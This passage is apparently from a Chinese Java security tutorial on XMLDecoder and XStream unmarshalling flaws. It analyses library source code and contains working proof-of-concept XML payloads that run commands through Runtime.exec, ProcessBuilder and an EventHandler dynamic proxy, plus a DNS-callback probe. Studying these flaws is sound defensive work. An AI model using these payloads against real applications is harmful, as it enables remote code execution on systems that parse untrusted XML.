的某些功能和使用方法，如 codebase。』\ndocs.oracle.com/javase/8/docs/technotes/tools/index.html#rmi 『RMI 相关工具链』\ndocs.oracle.com/javase/tutorial/rmi/overview.html 『JDK5 之后，不再需要 rmic 来构建 stub，提及 RMI 的动态加载功能，及 codebase。』\n\ndocs.oracle.com/javase/tutorial/rmi/server.html 『如何编写一个 RMI Server，以计算 PI 为例』\ndocs.oracle.com/javase/tutorial/rmi/client.html 『如何编写一个 RMI Client』\ndocs.oracle.com/javase/tutorial/rmi/example.html 『如何编译运行』\n\n\ndocs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html 『 codebase 的介绍』\ndocs.oracle.com/javase/8/docs/technotes/tools/unix/rmiregistry.html 『rmiregistry 使用说明』\ngithub.com/nmap/nmap/blob/master/scripts/rmi-dumpregistry.nse 『nmap rmiregistry 扫描脚本』\n"},"articles/security/java/roadmap/Java-安全---其它反序列化漏洞":{"title":"Java 安全 - 其它反序列化漏洞","links":["articles/security/java/marshal/Turning-Your-Data-into-Code-Execution","articles/security/java/roadmap/Java-安全---反序列化","articles/security/java/roadmap/Java-安全---反序列化利用链","articles/security/java/gadget/URLDNS","articles/security/java/xstream/XStream-下的-URLDNS","articles/programming/java/POJO-vs-JavaBeans"],"tags":[],"content":"mbechler 在 Java 语言生态下的其它类型反序列化漏洞中，做了一项非常具有开创性的工作。建议阅读他的研究报告 Java Unmarshaller Security Turning Your Data into Code Execution 再进行学习，或参考之前的文章 Turning Your Data into Code Execution 了解其大致内容。\nJAXB\nJava Architecture for XML Binding (JAXB) 提供了一种模式，可将 XML 文档与 Java 对象相互绑定。JAXB 当前最新版本是 2.0，注意在 1.0 版本中是不支持将 Java 对象 Marshal 为 XMl 文档的。\nSerialize 与 Marshal\n尽管在 Java 安全 - 反序列化 和 Java 安全 - 反序列化利用链 中一直提及的序列化/反序列化的相关名词为 Serialize/Deserialize，但广义上讲它们（Java 原生 Serialize/Deserialize）只是冰山一角。\nSerialize/Deserialize 在计算机科学中更多的是指将数据转换为字节流，它并不关心传递的数据是什么。而 Marshal/Unmarshal（编组/解组） 则更关心是，将一个运行时环境中的对象，传递至另一个运行时环境中。至于它是如何对对象进行编组的，以及以什么样的形式进行存储和传输则依赖于具体实现，常见的有 XML 和 Json 两种数据载体。后面的内容会使用编组/解组，而非序列化/反序列化。\n而有关两者概念之间更具体的差异，可以参看 维基百科 中的内容。\nXMLEncoder/XMLDecoder\nXMLEncoder/XMLDecoder 是对 Java 原生 Marshal 机制的一种补充，具体可见文档说明：\n\nThe XMLEncoder class is a complementary alternative to the ObjectOutputStream and can used to generate a textual representation of a JavaBean in the same way that the ObjectOutputStream can be used to create binary representation of Serializable objects.\n\nXMLEncoder 相比于 ObjectOutputStream 最大的特点是 Marshal 后的内容是可读的文本，根据文档描述它主要用于 JavaBean 的 Marshal 操作。文档中给了一个 swing UI 组件 Marshal 之后的示例\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n &lt;java version=&quot;1.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;\n &lt;object class=&quot;javax.swing.JFrame&quot;&gt;\n   &lt;void property=&quot;name&quot;&gt;\n     &lt;string&gt;frame1&lt;/string&gt;\n   &lt;/void&gt;\n   &lt;void property=&quot;bounds&quot;&gt;\n     &lt;object class=&quot;java.awt.Rectangle&quot;&gt;\n       &lt;int&gt;0&lt;/int&gt;\n       &lt;int&gt;0&lt;/int&gt;\n       &lt;int&gt;200&lt;/int&gt;\n       &lt;int&gt;200&lt;/int&gt;\n     &lt;/object&gt;\n   &lt;/void&gt;\n   &lt;void property=&quot;contentPane&quot;&gt;\n     &lt;void method=&quot;add&quot;&gt;\n       &lt;object class=&quot;javax.swing.JButton&quot;&gt;\n         &lt;void property=&quot;label&quot;&gt;\n           &lt;string&gt;Hello&lt;/string&gt;\n         &lt;/void&gt;\n       &lt;/object&gt;\n     &lt;/void&gt;\n   &lt;/void&gt;\n   &lt;void property=&quot;visible&quot;&gt;\n     &lt;boolean&gt;true&lt;/boolean&gt;\n   &lt;/void&gt;\n &lt;/object&gt;\n &lt;/java&gt;\n与 ObjectOutputStream/ObjectIntputStream 的不同\n此外 XMLEncoder 与 ObjectOutputStream 还存在很多差异，这最主要的原因是因为 XMLEncoder/XMLDecoder 是针对 JavaBean 设计的，导致它们的实现逻辑存在差异。先看一段代码\n// Person.java\npublic class Person {\n    public String name;\n \n    private int age;\n \n    public Person() {\n        this.name = &quot;t&quot;;\n        this.age = 1;\n    }\n \n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n \n    public String getName() {\n        System.out.println(&quot;call getName of Person&quot;);\n        return name;\n    }\n \n    public void setName(String name) {\n        System.out.println(&quot;call setName of Person&quot;);\n        this.name = name;\n    }\n \n    public int getAge() {\n        System.out.println(&quot;call getAge of Person&quot;);\n        return age;\n    }\n \n    public void setAge(int age) {\n        System.out.println(&quot;call setAge of Person&quot;);\n        this.age = age;\n    }\n}\n \n// XMLEncoderTest.java\npublic class XMLEncoderTest {\n    public static void main(String[] args) throws Exception {\n        XMLEncoder e = new XMLEncoder(\n                new BufferedOutputStream(\n                        new FileOutputStream(&quot;target/person.xml&quot;)));\n        e.writeObject(new Person(&quot;trganda&quot;, 18));\n        e.close();\n \n    }\n}\n输出如下\ncall getAge of Person\ncall getAge of Person\ncall getAge of Person\ncall setAge of Person\ncall getName of Person\ncall getName of Person\n\n得到的编组后的 person.xml 文件如下\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;java version=&quot;1.8.0_66&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;\n &lt;object class=&quot;com.trganda.xmldecoder.bean.Person&quot; id=&quot;Person0&quot;&gt;\n  &lt;void class=&quot;com.trganda.xmldecoder.bean.Person&quot; method=&quot;getField&quot;&gt;\n   &lt;string&gt;name&lt;/string&gt;\n   &lt;void method=&quot;set&quot;&gt;\n    &lt;object idref=&quot;Person0&quot;/&gt;\n    &lt;string&gt;trganda&lt;/string&gt;\n   &lt;/void&gt;\n  &lt;/void&gt;\n  &lt;void property=&quot;age&quot;&gt;\n   &lt;int&gt;18&lt;/int&gt;\n  &lt;/void&gt;\n &lt;/object&gt;\n&lt;/java&gt;\nPerson 类是一个很典型的 JavaBean，XMLEncoder 在对 Person 对象进行编组时会调用 getter 或 setter 方法读取和设置属性。在 person.xml 文件中有一个很明显的差异，age 属性的内容与 name 不同完全不同，具体原因后面再分析。在这之前先了解 XMLEncoder 的编组后的 XMl 文件语法约定。\nXML 语法约定\nXMLEncoder 文档中有详细介绍所用的 XML 语法约定，这有助于理解生成的 XML 文件，从而在后续构造恶意的 XML 文件。\n\n每个元素表示一个方法调用。\nobject 标签表示一个表达式『自身以及子标签整体为一个表达式 Expression，其它标签可看作语句 Statement』，其值将可用作内部子标签元素的参数。\nvoid 标签表示需要执行的语句，但它的返回值不会传递给子标签。\n\n包含元素的元素使用这些元素作为参数，除非它们具有标签 void，例如 &lt;void method=&quot;set&quot;&gt; 表示使用参数 Person0 和 trganda 来调用 set 方法。\n而要调用的方法由 method 属性指定，默认的方法为 new，即通过反射调用 newInstance 创建对象，可见 java.beans.Statement#invokeInternal。\n当未指定 method 属性值时，如果指定了 property 属性会使用 get/set 加上 property 属性首字母大写，也就是调用 getter/setter 方法。\n\n\nXML 的标准 id 和 idref 属性用于引用前面的表达式，例如前面的 &lt;object idref=&quot;Person0&quot;/&gt;。\nclass 属性用于显式指定静态方法或构造函数所在的类的全限定名。\n\nclass 标签还可用于表示类型引用，例如前面的 &lt;class&gt;javax.swing.JButton&lt;/class&gt;\n\n\nString 类型会被写入标记 &lt;string&gt; 中，例如 &lt;string&gt;trganda&lt;/string&gt;\n数组类型的引用使用 array 标记，并通过 class 和 length 属性分别指定数组的类型和长度。\n\n大致了解了语法约定，就能看懂前面生成的 person.xml 文件了，下面为添加了注释的 person.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!-- JDK 版本 1.8.0_66，需使用 java.beans.XMLDecoder 进行解组 --&gt;\n&lt;java version=&quot;1.8.0_66&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;\n &lt;!-- 调用 com.trganda.xmldecoder.bean.Person 无参构造方法，创建一个 Person 对象，与 id Person0 关联 --&gt;\n &lt;object class=&quot;com.trganda.xmldecoder.bean.Person&quot; id=&quot;Person0&quot;&gt;\n  &lt;!-- 调用 com.trganda.xmldecoder.bean.Person 的 Class 对象的 getField 方法，这里使用的是反射 --&gt;\n  &lt;void class=&quot;com.trganda.xmldecoder.bean.Person&quot; method=&quot;getField&quot;&gt;\n   &lt;!-- getField 方法的参数为 name --&gt;\n   &lt;string&gt;name&lt;/string&gt;\n   &lt;!-- 调用上一步调用返回的 Field 的 set 方法 --&gt;\n   &lt;void method=&quot;set&quot;&gt;\n    &lt;!-- set 方法的参数为前面创建的 Person 对象，和字符串 trganda  --&gt;\n    &lt;object idref=&quot;Person0&quot;/&gt;\n    &lt;string&gt;trganda&lt;/string&gt;\n   &lt;/void&gt;\n  &lt;/void&gt;\n  &lt;!-- 调用对象 Person0 的 setAge 方法 --&gt;\n  &lt;void property=&quot;age&quot;&gt;\n   &lt;!-- 参数为 18 --&gt;\n   &lt;int&gt;18&lt;/int&gt;\n  &lt;/void&gt;\n &lt;/object&gt;\n&lt;/java&gt;\nEvilXMLDecoder.java\n从前面的语法约定可以了解到，XMLDecoder 会按照 XML 文件中定义的内容进行方法调用，那这意味着如果能控制 XML 文件的内容，可以让它调用其它方法。\n构造一个 calc.xml 文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;java version=&quot;1.8.0_66&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;\n    &lt;object class=&quot;java.lang.Runtime&quot; method=&quot;getRuntime&quot;&gt;\n        &lt;void method=&quot;exec&quot;&gt;\n            &lt;string&gt;open -a calculator&lt;/string&gt;\n        &lt;/void&gt;\n    &lt;/object&gt;\n&lt;/java&gt;\nEvilXMLDecoder.java 的代码如下\npublic class EvilXMLDecoder {\n    public static void main(String[] args) throws Exception {\n        XMLDecoder d = new XMLDecoder(new FileInputStream(&quot;target/calc.xml&quot;));\n        Object person = d.readObject();\n        d.close();\n    }\n}\n执行后即可弹计算器\n\n整个解组过程的调用栈很长，这里直接挑其中涉及方法调用的代码进行分析，相关代码位于 java.beans.Statement#invokeInternal，以下为简化后的代码，整个方法的逻辑\nprivate Object invokeInternal() throws Exception {\n\tObject target = getTarget();\n\tString methodName = getMethodName();\n\t// ...\n\tObject[] arguments = getArguments();\n\tif (arguments == null) {\n\t\targuments = emptyArray;\n\t}\n \n\tif (target instanceof Class) {\n\t\t// 默认调用 newInstance 方法\n\t\tif (methodName.equals(&quot;new&quot;)) {\n\t\t\tmethodName = &quot;newInstance&quot;;\n\t\t}\n\t\t// Provide a short form for array instantiation by faking an nary-constructor.\n\t\tif (methodName.equals(&quot;newInstance&quot;) &amp;&amp; ((Class)target).isArray()) {\n\t\t\t// 如果目标类型为数组，则通过 Array.newInstance 方法创建对象\n\t\t\tObject result = Array.newInstance(((Class)target).getComponentType(), arguments.length);\n\t\t\tfor(int i = 0; i &lt; arguments.length; i++) {\n\t\t\t\tArray.set(result, i, arguments[i]);\n\t\t\t}\n\t\t\treturn result;\n\t\t}\n\t\tif (methodName.equals(&quot;newInstance&quot;) &amp;&amp; arguments.length != 0) {\n\t\t\t// 其它情况根据参数类型查找对应的构造方法并调用\n\t\t\tif (target == Character.class &amp;&amp; arguments.length == 1 &amp;&amp;\n\t\t\t\targClasses[0] == String.class) {\n\t\t\t\treturn new Character(((String)arguments[0]).charAt(0));\n\t\t\t}\n\t\t\ttry {\n\t\t\t\tm = ConstructorFinder.findConstructor((Class)target, argClasses);\n\t\t\t}\n\t\t\tcatch (NoSuchMethodException exception) {\n\t\t\t\tm = null;\n\t\t\t}\n\t\t}\n\t\tif (m == null &amp;&amp; target != Class.class) {\n\t\t\tm = getMethod((Class)target, methodName, argClasses);\n\t\t}\n\t\tif (m == null) {\n\t\t\tm = getMethod(Class.class, methodName, argClasses);\n\t\t}\n\t} else {\n\t\tif (target.getClass().isArray() &amp;&amp;\n\t\t\t(methodName.equals(&quot;set&quot;) || methodName.equals(&quot;get&quot;))) {\n\t\t\tint index = ((Integer)arguments[0]).intValue();\n\t\t\tif (methodName.equals(&quot;get&quot;)) {\n\t\t\t\treturn Array.get(target, index);\n\t\t\t} else {\n\t\t\t\tArray.set(target, index, arguments[1]);\n\t\t\t\treturn null;\n\t\t\t}\n\t\t}\n\t\tm = getMethod(target.getClass(), methodName, argClasses);\n\t} if (m != null) {\n\t\ttry {\n\t\t\t// 如果指定了 method 属性，则调用相应方法\n\t\t\tif (m instanceof Method) {\n\t\t\t\treturn MethodUtil.invoke((Method)m, target, arguments);\n\t\t\t} else {\n\t\t\t\treturn ((Constructor)m).newInstance(arguments);\n\t\t\t}\n\t\t} catch (IllegalAccessException iae) {\n\t\t\tthrow new Exception(&quot;Statement cannot invoke: &quot; +\n\t\t\t\t\t\t\t\tmethodName + &quot; on &quot; + target.getClass(),\n\t\t\t\t\t\t\t\tiae);\n\t\t} catch (InvocationTargetException ite) {\n\t\t\tThrowable te = ite.getTargetException();\n\t\t\tif (te instanceof Exception) {\n\t\t\t\tthrow (Exception)te;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tthrow ite;\n\t\t\t}\n\t\t}\n\t}\n\tthrow new NoSuchMethodException(toString());\nStatement#invokeInternal 的方法调用逻辑为，\n\n如果未指定 method 属性，则通过反射调用 newInstance 方法，其中对于数组类型会特殊处理。\n如果指定了 method 属性，则通过反射调用相应的 method 方法。\n\n了解了这些之后，那么构造恶意 XML 文件就更简单了。下面再是一个通过 ProcessBuilder 进行命令执行的 XML 示例\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;java version=&quot;1.8.0_102&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;\n  &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;\n    &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;\n      &lt;void index=&quot;0&quot;&gt;\n        &lt;string&gt;open&lt;/string&gt;\n      &lt;/void&gt;\n      &lt;void index=&quot;1&quot;&gt;\n         &lt;string&gt;-a&lt;/string&gt;\n      &lt;/void&gt;\n      &lt;void index=&quot;2&quot;&gt;\n         &lt;string&gt;calculator&lt;/string&gt;\n      &lt;/void&gt;\n    &lt;/array&gt;\n    &lt;void method=&quot;start&quot;/&gt;\n  &lt;/void&gt;\n&lt;/java&gt;\nXMLDecoder 下的 URLDNS\nXMLDecoder 的语法约定可以非常轻松的动态调用方法，构造一个实现 URLDNS 的 Poc 并不难，具体如下\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;java version=&quot;1.8.0_66&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;\n    &lt;object class=&quot;java.net.URL&quot;&gt;\n        &lt;string&gt;tea.trganda.top&lt;/string&gt;\n        &lt;void method=&quot;hashCode&quot;/&gt;\n    &lt;/object&gt;\n&lt;/java&gt;\nXMLDecoder 的限制\n从注释文档，能了解到，XMLDeocder 在解组时只能调用 public 方法，这一点也符合 JavaBean 的规范。相关的代码位于 com.sun.beans.finder.MethodFinder$Cache#create 的静态代码块中\nstatic {\n\tCACHE = new Cache&lt;Signature, Method&gt;(Kind.SOFT, Kind.SOFT) {\n\t\tpublic Method create(Signature var1) {\n\t\t\ttry {\n\t\t\t\tMethodFinder var2 = new MethodFinder(var1.getName(), var1.getArgs());\n\t\t\t\t// [1] var1.getType().getMethods() 返回的只有 public 方法，表示查找范围。\n\t\t\t\treturn MethodFinder.findAccessibleMethod((Method)var2.find(var1.getType().getMethods()));\n\t\t\t} catch (Exception var3) {\n\t\t\t\tthrow new SignatureException(var3);\n\t\t\t}\n\t\t}\n\t};\n}\n在 create 方法的 [1] 中，find 方法传入的参数来自 var1.getType().getMethods()，表示方法查找的范围，而这里调用的实际方法为 Class#getMethods()，该方法的注释中已说明它只会返回 public 方法。\n\nReturns an array containing Method objects reflecting all the public methods of the class or interface represented by this Class object, including those declared by the class or interface and those inherited from superclasses and superinterfaces.\n\n防护措施？\nXMLEncoder/XMLDecoder 本身只是正常功能，重点在于使用者如何抉择。在默认情况下，XMLDecoder 是不会有任何过滤或检查的。但是 XMLDecoder 的 parsingComplete 方法会使用 AccessController.doPrivileged 对方法调用进行鉴权，其中成员 acc = AccessController.getContext()。\nprivate boolean parsingComplete() {\n\tif (this.input == null) {\n\t\treturn false;\n\t}\n\tif (this.array == null) {\n\t\tif ((this.acc == null) &amp;&amp; (null != System.getSecurityManager())) {\n\t\t\tthrow new SecurityException(&quot;AccessControlContext is not set&quot;);\n\t\t}\n\t\tAccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() {\n\t\t\tpublic Void run() {\n\t\t\t\tXMLDecoder.this.handler.parse(XMLDecoder.this.input);\n\t\t\t\treturn null;\n\t\t\t}\n\t\t}, this.acc);\n\t\tthis.array = this.handler.getObjects();\n\t}\n但这种方式太过麻烦，而且只是通过权限进行操作限制，需要对 Java 的安全机制有一定的了解，相比之下采用更安全且易于配置的第三方 Marshal 方案是更好的选择，例如 XStream。\nXStream\n\nXStream 诞生初期可一点也不安全。如无特殊说明，使用的 XStream 版本为 1.4.6\n\nXStream 支持将 Java 对象 Marshal 为 XML 文档，当然它也支持 Json 格式。它最大的特点是自由度很高，不再拘泥于传统的 JavaBean 的模式，无论是否有 getter/setter 方法，无论成员访问属性是否为 public 都能够进行 Marshal 操作，并且支持 final 成员和内部类。\n这间接导致 XStream 覆盖的 Java 对象图『可理解成支持的类的范围』的访问更加广泛，Java 安全 - 反序列化利用链 中的链条所需的类几乎都可用于 XStream，甚至不需要类实现 Serializable 接口，而且你可以通过 XStream 直接去 Marshal 代理类。这意味着，能够更加自由的动态的去调用方法。\nDinis Cruz 与 Abraham 和 Alvaro 在 DefCon 2013 的议题 “RESTing on Your Laurels Will Get You Pwned” 上展示了 XStream 的远程代码执行漏洞的利用。在开始之前先来看如何使用 XStream，以及它的一点工作机制。\nXStreamMarshal.java\n编写一个简单的 POJO 类 Square，其中使用了 XStream 中定义的注解 XStreamAlias 设置类的别名，用于 XML 中的标签名。也可以使用 XStream#alias 方法设置别名。\n@XStreamAlias(&quot;square&quot;)\npublic class Square {\n    @XStreamAlias(&quot;size&quot;)\n    int size;\n \n    public int getSize() {\n        return size;\n    }\n \n    public void setSize(int size) {\n        this.size = size;\n    }\n \n}\nXStreamMarshal.java 文件的内容如下\npublic class XStreamMarshal {\n    private static final XStream xstream =\n            new XStream() {\n                {\n                    processAnnotations(Square.class);\n                }\n            };\n \n    public static void main(String[] args) {\n        Square sq = new Square();\n        sq.setSize(5);\n \n        String resultXML = xstream.toXML(sq);\n        System.out.println(resultXML);\n    }\n}\n执行之后的输出如下\n&lt;square&gt;\n  &lt;size&gt;5&lt;/size&gt;\n&lt;/square&gt;\n如果不设置别名，生成的文件内容如下，标签会使用类的全限定名称。\n&lt;com.trganda.xstream.Square&gt;\n  &lt;size&gt;5&lt;/size&gt;\n&lt;/com.trganda.xstream.Square&gt;\nXStream 的架构设计\n\n下面只是简单概述，具体可参考 XStream Architecture。\n\nXStream 的工作过程分为两步，Setup 和 Execution，前者是线程不安全的。XStreamMarshal.java 中的 processAnnotations(Square.class); 就是 Setup 的一部分『否则 @XStreamAlias 不会生效』，在开始 Marshal 对象之前，需要先进行 Setup，也就是初始化 Context；而后调用 toXML 则是 Execution。\n那么前面的 @XStreamAlias 是如何发挥作用的？\nXStream 中定义了一个 Mapper 接口以及诸多实现类，这些 Mappers 可以链式组合在一起，如果前一个 Mapper 无法处理时会交给下一个。它们的作用之一就是支持别名；另一个主要的作用和 XStream 的安全机制有关，后续再介绍。\n而引发安全隐患的部分则是 Converter。\nConverter 的作用是将对象转换成 XML 文档或是完成它的逆过程。XStream 内置了许多 Converters 用于支持基础的 Java 类型，和大部分常见类。它会是后续主要关注的内容。\nConverter\n为了直观了解 Converter 的作用，来看一个示例。前面已经提过，在不使用别名都情况下，生成的 XML 文件的标记会使用全限定名称，显得很臃肿。而若想简化生成的 XML 内容，除了使用别名，还可以选择实现一个自定义的 Converter。\n\n参考 官方教程。\n\n定义一个 SquareConverter，canConvert 用于对类型进行过滤，marshal/unmarshal 对应的编组/解组操作。\npublic class SquareConverter implements Converter {\n \n    public boolean canConvert(Class clazz) {\n        // 表示只支持 Square 类型\n        return clazz.equals(Square.class);\n    }\n \npublic void marshal(\n        Object value, HierarchicalStreamWriter writer, MarshallingContext context) {\n        Square square = (Square) value;\n        writer.startNode(&quot;squareSize&quot;);\n        writer.setValue(String.valueOf(square.getSize()));\n        writer.endNode();\n    }\n \n    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {\n        Square square = new Square();\n        reader.moveDown();\n        square.setSize(Integer.parseInt(reader.getValue()));\n        reader.moveUp();\n        return square;\n    }\n}\n接着，需要注册 SquareConverter 至 XStream 的 Context 中\npublic static void main(String[] args) {\n\tSquare square = new Square();\n\tsquare.setSize(10);\n \n\tXStream xStream = new XStream(new DomDriver());\n\txStream.registerConverter(new SquareConverter());\n\t// 此时注解 @XStreamAlias(&quot;square&quot;) 不生效，需要手动指定\n\txStream.alias(&quot;square&quot;, Square.class);\n\tSystem.out.println(xStream.toXML(square));\n}\n生成的内容如下\n&lt;square&gt;\n  &lt;squareSize&gt;10&lt;/squareSize&gt;\n&lt;/square&gt;\n这里有一个问题，Converter 并不能修改外层的标签的名字，还是需要用到别名。从前面的例子能够大致了解 Converter 的作用，你可以将 Converter 类比成 readObject/writeObject 的方法在 Java 原生反序列化中的作用。\n动态方法执行\nXStream 的会将对象转换成 XML，反之亦然。可若是想在 Unmarshal 的过程中执行命令则意味着需要能够在 Unmarshal 的过程中动态执行方法。就如同 Java 原生反序列化一样，会调用 readObject 方法。\n在 Java 原生反序列化中代理类是无法被序列化的，但是在 XStream 中却不同，XStream 中的 DynamicProxyConverter 实现了 Converter 接口，它可以对代理类进行编组和解组操作。原理很简单，虽然动态代理类自身无法被序列化，但是它代理的接口和使用的 InvocationHandler 实例对象是可以的。所以可以通过这两者来恢复一个动态代理对象。下面是官网的一个示例\n&lt;dynamic-proxy&gt;\n  &lt;interface&gt;com.foo.Blah&lt;/interface&gt;\n  &lt;interface&gt;com.foo.Woo&lt;/interface&gt;\n  &lt;handler class=&quot;com.foo.MyHandler&quot;&gt;\n    &lt;something&gt;blah&lt;/something&gt;\n  &lt;/handler&gt;\n&lt;/dynamic-proxy&gt;\nDefCon 2013 的议题 “RESTing on Your Laurels Will Get You Pwned” 的合作者之一 Alvaro 曾向 XStream 报告过一个 问题，对于类似如下的 XML 文档\n&lt;dynamic-proxy&gt;\n&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&lt;handler class=&quot;java.beans.EventHandler&quot;&gt;\n    &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;\n        &lt;command&gt;\n             &lt;string&gt;open&lt;/string&gt;\n             &lt;string&gt;-a&lt;/string&gt;\n             &lt;string&gt;calculator&lt;/string&gt;\n        &lt;/command&gt;\n    &lt;/target&gt;\n    &lt;action&gt;start&lt;/action&gt;\n&lt;/handler&gt;\n&lt;/dynamic-proxy&gt;\n在通过 XStream 解组后，调用返回对象的任意方法会导致命令被执行，例如这里会打开一个计算器。本质上这就是一段命令执行的 Poc，但是还不够完善，因为无法直接在解组时触发命令的执行，而是需要在调用一次返回的对象的任意方法。\nXStreamEventHandler.java\n而上面的这段 XML 文档的内容，可由如下的 Java 代码生成『忽略生成的 XML 文档中的部分内容后』。\npublic static void main(String[] args) {\n\tComparable handler = EventHandler.create(Comparable.class, new\n\t\t\tProcessBuilder(&quot;open&quot;, &quot;-a&quot;, &quot;calculator&quot;), &quot;start&quot;);\n\tString xml = new XStream().toXML(handler);\n\tSystem.out.println(xml);\n}\n如何在 Unmarshal 时触发？\n那么现在的问题是如何在解组时直接触发命令执行？或者说，如何调用动态代理对象的任意方法。XStream 的开发者对 Alvaro 提出的问题的回复中其实已经提及了，作者给了一段示例代码\npublic static void main(String[] args) {\n\tSet&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();\n\tset.add(&quot;foo&quot;);\n\tset.add(EventHandler.create(Comparable.class, new\nProcessBuilder(&quot;open&quot;, &quot;-a&quot;, &quot;calculator&quot;), &quot;start&quot;));\n}\n提到该问题可能由 EventHandler.create 方法引起，如果执行上面的代码则会导致命令执行。因为它会触发 put 方法导致 EventHandler 的 invoke 方法被调用，进一步导致命令执行。注意这里的 set.add(&quot;foo&quot;); 并非必需的。\n因为在 TreeMap#put 方法中，即使当前 Map 为空『root == null』，也会调用 compare(key, key) 并触发 compareTo 方法调用，同样会导致命令执行。\npublic V put(K key, V value) {\n\tEntry&lt;K,V&gt; t = root;\n\tif (t == null) {\n\t\tcompare(key, key); // type (and possibly null) check\n \nfinal int compare(Object k1, Object k2) {\n\t// 这里 k1 就是 EventHandler.create 创建的代理对象\n\treturn comparator==null ? ((Comparable&lt;? super K&gt;)k1).compareTo((K)k2)\n\t\t: comparator.compare((K)k1, (K)k2);\n}\n注意这里的 set.add(&quot;foo&quot;); 并非必需的，因为在 TreeMap#put 方法中，即使当前 Map 为空『root == null』，也会调用一次 compare(key, key) 并触发 compareTo 方法调用，同样会导致命令执行，后面会分析说明。\n简化调用关系梳理\nTreeSet.add\n  // 调用 TreeMap.put\n  m.put(e, PRESENT)\n\t// 调用代理对象的 compareTo 方法\n    cmp = k.compareTo(t.key);\n      // 触发 invoke 方法\n      EventHandler.invoke\n        invokeInternal(proxy, method, arguments)\n          // 调用 ProcessBuilder#start 方法，这里参数 newArgs 为 t.key 的值\n          MethodUtil.invoke(targetMethod, target, newArgs)\n从调用关系上看，在解组时若能调用 TreeSet#add/TreeMap#put （或是 TreeSet#addAll/TreeMapt#putAll） 那么就可以实现命令执行。而与 TreeSet 相关的 Converter 是 TreeSetConverter，它的注释已说明它的作用。\n\nConverts a java.util.TreeSet to XML, and serializes the associated java.util.Comparator. The converter assumes that the elements in the XML are already sorted according the comparator.\n\n查看 TreeSetConverter#unmarshal 方法，在 [2] 先读取 Comparator，本例为空\npublic Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {\n\tTreeSet result = null;\n\tfinal TreeMap treeMap;\n\t// [2] 先读取 Comparator，本例为空\n\tComparator unmarshalledComparator = treeMapConverter.unmarshalComparator(reader, context, null);\n\tboolean inFirstElement = unmarshalledComparator instanceof Mapper.Null;\n\tComparator comparator = inFirstElement ? null : unmarshalledComparator;\n\tif (sortedMapField != null) {\n\t\tTreeSet possibleResult = comparator == null ? new TreeSet() : new TreeSet(comparator);\n\t\tObject backingMap = null;\n\t\ttry {\n\t\t\t// [3] sortedMapField 是通过反射获取的 TreeSet 中的成员 m，对应类型为 TreeMap。\n\t\t\tbackingMap = sortedMapField.get(possibleResult);\n\t\t} catch (IllegalAccessException e) {\n\t\t\tthrow new ConversionException(&quot;Cannot get backing map of TreeSet&quot;, e);\n\t\t}\n\t\tif (backingMap instanceof TreeMap) {\n\t\t\ttreeMap = (TreeMap)backingMap;\n\t\t\tresult = possibleResult;\n\t\t} else {\n\t\t\ttreeMap = null;\n\t\t}\n\t} else {\n\t\ttreeMap = null;\n\t}\n\tif (treeMap == null) {\n\t\t// ...\n\t} else {\n\t\t// [4] 填充内部的 TreeMap\n\t\ttreeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);\n\t}\n\treturn result;\n}\n查看 populateTreeMap 方法，\nprotected void populateTreeMap(HierarchicalStreamReader reader, UnmarshallingContext context, TreeMap result, Comparator comparator) {\n\tboolean inFirstElement = comparator == NULL_MARKER;\n\tif (inFirstElement) {\n\t\tcomparator = null;\n\t}\n\t// [5] 创建 PersortedMap\n\tSortedMap sortedMap = new PresortedMap(comparator != null &amp;&amp; JVM.hasOptimizedTreeMapPutAll() ? comparator : null);\n\tif (inFirstElement) {\n\t\t// we are already within the first entry\n\t\tputCurrentEntryIntoMap(reader, context, result, sortedMap);\n\t\treader.moveUp();\n\t}\n\t// [6] 读取每个 entry 并放入前面创建的 PersortedMap\n\tpopulateMap(reader, context, result, sortedMap);\n\ttry {\n\t\tif (JVM.hasOptimizedTreeMapPutAll()) {\n\t\t\tif (comparator != null &amp;&amp; comparatorField != null) {\n\t\t\t\tcomparatorField.set(result, comparator);\n\t\t\t}\n\t\t\t// [7] 调用 TreeMap#putAll 方法\n\t\t\tresult.putAll(sortedMap); // internal optimization will not call comparator\n\t\t}\n\t\t// ...\n\t} catch (final IllegalAccessException e) {\n\t\tthrow new ConversionException(&quot;Cannot set comparator of TreeMap&quot;, e);\n\t}\n}\n在 [7] 中会调用 TreeMap#putAll 方法，实际为 AbstractMap#putAll 方法\npublic void putAll(Map&lt;? extends K, ? extends V&gt; m) {\n\tfor (Map.Entry&lt;? extends K, ? extends V&gt; e : m.entrySet())\n\t\tput(e.getKey(), e.getValue());\n}\n内部再调用 TreeMap#put 方法\npublic V put(K key, V value) {\n\tEntry&lt;K,V&gt; t = root;\n\tif (t == null) {\n\t\t// [8] 此处会调用一次 compare，进而调用 compareTo\n\t\tcompare(key, key); // type (and possibly null) check\n\t\t// ...\n\t\treturn null;\n\t}\n\tint cmp;\n\tEntry&lt;K,V&gt; parent;\n\t// split comparator and comparable paths\n\tComparator&lt;? super K&gt; cpr = comparator;\n\tif (cpr != null) {\n\t\t// ...\n\t}\n\telse {\n\t\tif (key == null)\n\t\t\tthrow new 